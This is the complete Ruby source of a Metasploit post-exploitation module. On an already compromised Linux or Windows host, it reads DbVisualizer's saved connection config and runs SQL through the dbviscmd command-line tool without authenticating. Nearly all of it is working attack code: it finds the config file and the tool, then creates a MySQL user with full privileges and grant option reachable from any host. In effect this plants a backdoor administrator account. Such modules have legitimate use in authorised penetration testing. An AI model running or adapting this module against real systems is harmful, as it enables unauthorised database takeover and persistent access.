##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multi Manage DbVisualizer Add Db Admin',
        'Description'   => %q{
           Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases
           (With GUI). The remote database can be accessed from the command line without the need
           to authenticate, which can be abused to create an administrator in the database with the
           proper database permissions. Note: This module currently only supports MySQL.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
        'References'    =>
          [
            ['URL', 'http://youtu.be/0LCLRVHX1vA']
          ],
        'Platform'      => %w{ linux win },
        'SessionTypes'  => [ 'meterpreter' ]
      ))

   register_options(
      [
        OptString.new('DBALIAS', [true,'Use dbvis_enum module to find out databases and aliases', 'localhost']),
        OptString.new('DBUSERNAME', [true,'The user you want to add to the remote database', 'msf']),
        OptString.new('DBPASSWORD', [true,'User password to set', 'msfRocks'])
      ])

  end

  def run
    db_type = exist_and_supported()
    unless db_type.blank?
      dbvis = find_dbviscmd()
      unless dbvis.blank?
        sql = get_sql(db_type)
        errors = dbvis_query(dbvis,sql)
        if errors == true
          print_error("No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ")
        else
          print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
        end
      end
    end
  end

  # Check if the alias exist and if database is supported by this script
  def exist_and_supported()
    case session.platform
    when 'linux'
      user = session.shell_command("whoami")
      print_status("Current user is #{user}")
      if (user =~ /root/)
        user_base = "/root/"
      else
         user_base = "/home/#{user}/"
      end
      dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
    when 'windows'
      user_profile = session.sys.config.getenv('USERPROFILE')
      dbvis_file = "#{user_profile}\\.dbvis\\config70\\dbvis.xml"
    end

    unless file?(dbvis_file)
      #File not found, we next try with the old config path
      print_status("File not found: #{dbvis_file}")
      print_status("This could be an older version of dbvis, trying old path")

      case session.platform
      when 'linux'
        dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
      when 'windows'
        dbvis_file = "#{user_profile }\\.dbvis\\config\\dbvis.xml"
      end
      unless file?(dbvis_file)
        print_error("File not found: #{dbvis_file}")
        return
      end

      old_version = true
    end

    print_status("Reading : #{dbvis_file}" )
    raw_xml = ""
    begin
      raw_xml = read_file(dbvis_file)
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{dbvis_file}, file may be empty")
      return
    end

    db_found = false
    alias_found = false
    db_type = nil
    db_type_ok = false

    # fetch config file
    raw_xml.each_line do |line|

      if line =~ /<Database id=/
        db_found = true
      elsif line =~ /<\/Database>/
        db_found = false
      end

      if db_found == true

        # checkthe alias
        if (line =~ /<Alias>([\S+\s+]+)<\/Alias>/i)
          if datastore['DBALIAS'] == $1
            alias_found = true
            print_good("Alias #{datastore['DBALIAS']} found in dbvis.xml")
          end
        end

        if (line =~ /<Userid>([\S+\s+]+)<\/Userid>/i)
          if alias_found
            print_good("Username for this connection : #{$1}")
          end
        end

        # check the type
        if (line =~ /<Type>([\S+\s+]+)<\/Type>/i)
          if alias_found
            db_type = $1
            db_type_ok = check_db_type(db_type)
            if db_type_ok
              print_good("Database #{db_type} is supported ")
            else
              print_error("Database #{db_type} is not supported (yet)")
              db_type = nil
            end
          alias_found = false
          end
        end
      end
    end
    if db_type.blank?
      print_error("Database alias not found in dbvis.xml")
    end
    return db_type   # That is empty if DB is not supported
  end

  # Find path to dbviscmd.sh|bat
  def find_dbviscmd
    case session.platform
    when 'linux'
      dbvis = session.shell_command("locate dbviscmd.sh").chomp
      if dbvis.chomp == ""
        print_error("dbviscmd.sh not found")
        return nil
      else
        print_good("Dbviscmd found : #{dbvis}")
      end
    when 'windows'
      # Find program files
      progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
      progfiles_x86 = progfiles_env['ProgramFiles(X86)']
      if not progfiles_x86.blank? and progfiles_x86 !~ /%ProgramFiles\(X86\)%/
        program_files = progfiles_x86 # x64
      else
        program_files = progfiles_env['ProgramFiles'] # x86
      end
      dirs = []
      session.fs.dir.foreach(program_files) do |d|
        dirs << d
      end
      dbvis_home_dir = nil
      #Browse program content to find a possible dbvis home
      dirs.each do |d|
        if (d =~ /DbVisualizer[\S+\s+]+/i)
          dbvis_home_dir=d
        end
      end
      if dbvis_home_dir.blank?
        print_error("Dbvis home not found, maybe uninstalled ?")
        return nil
      end
      dbvis =  "#{program_files}\\#{dbvis_home_dir}\\dbviscmd.bat"
      unless file?(dbvis)
        print_error("dbviscmd.bat not found")
        return nil
      end
      print_good("Dbviscmd found : #{dbvis}")
    end
    return dbvis
  end

  # Query execution method
  def dbvis_query(dbvis,sql)
    error = false
    resp = ''
    if file?(dbvis) == true
      f = session.fs.file.stat(dbvis)
      if f.uid == Process.euid or Process.groups.include?f.gid
        print_status("Trying to execute evil sql, it can take time ...")
        args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
        dbvis = "\"#{dbvis}\""
        cmd = "#{dbvis} #{args}"
        resp = cmd_exec(cmd)
        vprint_line
        vprint_status("#{resp}")
        if resp =~ /denied|failed/i
          error = true
        end
      else
         print_error("User doesn't have enough rights to execute dbviscmd, aborting")
      end
    else
      print_error("#{dbvis} is not a file")
    end
    return error
  end

  # Database dependent part

  # Check if db type is supported by this script
  def check_db_type(type)
   return type.to_s =~ /mysql/i
  end

  # Build proper sql
  def get_sql(db_type)
    if db_type =~ /mysql/i
      sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"

      sql << "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
      return sql
    end
    return nil
  end
end
